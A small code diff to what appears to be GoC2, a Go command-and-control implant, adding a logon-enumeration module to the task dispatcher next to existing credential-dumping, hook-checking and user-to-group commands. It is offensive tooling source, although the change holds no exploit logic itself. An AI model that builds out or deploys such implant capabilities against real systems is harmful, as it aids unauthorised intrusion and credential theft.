@@ -25,6 +25,7 @@ import (
 	"github.com/latortuga71/GoC2/internal/modules/credentials/dumpsecrets"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumdrivers"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumlocaluser"
+	"github.com/latortuga71/GoC2/internal/modules/enumeration/enumlogons"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/enummodules"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/env"
 	"github.com/latortuga71/GoC2/internal/modules/enumeration/hookchecker"
@@ -383,6 +384,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = addusertogroup.AddUserToGroup(t.Args)
 	case "remove-user":
 		result, cmdError = addusertogroup.RemoveUserFromGroup(t.Args)
+	case "enum-logons":
+		result, cmdError = enumlogons.EnumLogons()
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
